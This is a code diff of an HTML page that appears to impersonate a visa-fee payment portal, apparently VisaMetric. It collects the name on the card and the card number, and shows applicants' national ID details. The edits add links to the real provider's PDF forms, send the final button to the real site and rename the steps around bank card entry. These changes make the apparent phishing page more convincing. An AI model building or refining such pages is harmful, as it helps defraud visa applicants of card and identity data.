@@ -305,7 +305,7 @@
 
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
-        <p style="color: #8B0000; font-weight: bold;">Processing Request... Please wait 5 seconds.</p>
+        <p style="color: #8B0000; font-weight: bold;">Processing Request...</p>
     </div>
 
     <header>
@@ -326,10 +326,13 @@
         <aside class="sidebar">
             <h3>Quick Access</h3>
             <ul>
-                <li><a href="#">Visa Application Guide</a></li>
-                <li><a href="#">Required Documentation</a></li>
-                <li><a href="#">Latest News & Updates</a></li>
-                <li><a href="#">Contact Official Desk</a></li>
+                <li><a href="https://www.visametric.com/storage/images/pages/files2/64a80ed666fb2-Request-for-reimbursement-of-the-appointment-booking-fee.pdf">Schengen Visa Application Form</a></li>
+                 <li><a href="https://www.visametric.com/storage/images/pages/files2/66d01fd088419-6495bea12c418-Lettera-d'invito-per-turismo.pdf">Declaration of hospitality</a></li>
+                <li><a href="https://www.visametric.com/storage/images/pages/files2/64a80ed666fb2-Request-for-reimbursement-of-the-appointment-booking-fee.pdf">Request for reimbursement of the appointment booking fee</a></li>
+                <li><a href="https://www.visametric.com/storage/images/pages/files2/6495be4a2e4b4-Formulario-Visto-Nazionale.pdf">National Visa Application Form</a></li>
+                <li><a href="https://www.visametric.com/storage/images/pages/files2/66d01b6c9f94c-Letter-of-invitation-for-business.pdf">Letter of invitation for business</a></li>
+                <li><a href="https://www.visametric.com/storage/images/pages/files2/650be7afc5b39-Letter-of-Re-entry.pdf">Letter of Re-entry</a></li>
+
             </ul>
         </aside>
 
@@ -375,15 +378,15 @@
                 <h2>Payment Process - Visa Fee</h2>
                 
                 <div class="progress-bar">
-                    <div id="step1Header" class="progress-step active">Step 1: Applicant Info</div>
-                    <div id="step2Header" class="progress-step">Step 2: Card Details</div>
-                    <div id="step3Header" class="progress-step">Step 3: Confirmation</div>
-                    <div id="step4Header" class="progress-step">Step 4: Complete</div>
+                    <div id="step1Header" class="progress-step active">Bank Card Info</div>
+                    <div id="step2Header" class="progress-step">Card Details</div>
+                    <div id="step3Header" class="progress-step">Confirmation</div>
+                    <div id="step4Header" class="progress-step">Complete</div>
                 </div>
 
                 <form id="paymentForm">
                     <div id="paymentStep1">
-                        <h3>Step 1 of 4: Applicant Information</h3>
+                        <h3>Bank card Information</h3>
                         <div class="form-group">
                             <label for="p_name">Full Name on Card</label>
                             <input type="text" id="p_name" required>
@@ -396,7 +399,7 @@
                     </div>
 
                     <div id="paymentStep2" style="display: none;">
-                        <h3>Step 2 of 4: Payment Details</h3>
+                        <h3>Payment Details</h3>
                         <div class="form-group">
                             <label for="p_card">Card Number</label>
                             <input type="text" id="p_card" pattern="\d{16}" placeholder="16 digits" required>
@@ -414,7 +417,7 @@
                     </div>
 
                     <div id="paymentStep3" style="display: none;">
-                        <h3>Step 3 of 4: Review and Confirm</h3>
+                        <h3>Review and Confirm</h3>
                         <p>Please review your details before confirming payment.</p>
                         <ul id="reviewDetails" style="list-style: disc; padding-left: 20px; line-height: 1.8;"></ul>
                         <button type="button" id="backBtn3" class="form-action-btn" style="background-color: #555;">Back</button>
@@ -422,10 +425,9 @@
                     </div>
 
                     <div id="paymentStep4" style="display: none;">
-                        <h3>Step 4 of 4: Payment Complete</h3>
+                        <h3>Payment Complete</h3>
                         <div id="paymentResult" class="message success"></div>
-                        <button type="button" onclick="showSection('trackingSection')" class="form-action-btn">Return to Tracking Home</button>
-                    </div>
+<button type="button" onclick="window.location.href='https://www.visametric.com/'" class="form-action-btn">Return to Tracking Home</button>                    </div>
                 </form>
             </div>
             
@@ -550,7 +552,7 @@
         function displayAppointmentDetails(applicant) {
             const applicantInfoDiv = document.getElementById('applicantInfo');
             const details = [
-                { label: 'Name and Last Name', value: `${applicant.name} ${applicant.lastName}` },
+                { label: 'Name & Last Name', value: `${applicant.name} ${applicant.lastName}` },
                 { label: 'Nationality', value: applicant.nationality },
                 { label: 'National ID No', value: applicant.nationalId },
                 { label: 'CEU Number', value: applicant.ceuNumber },
@@ -690,4 +692,3 @@
     </script>
 </body>
 </html>
-
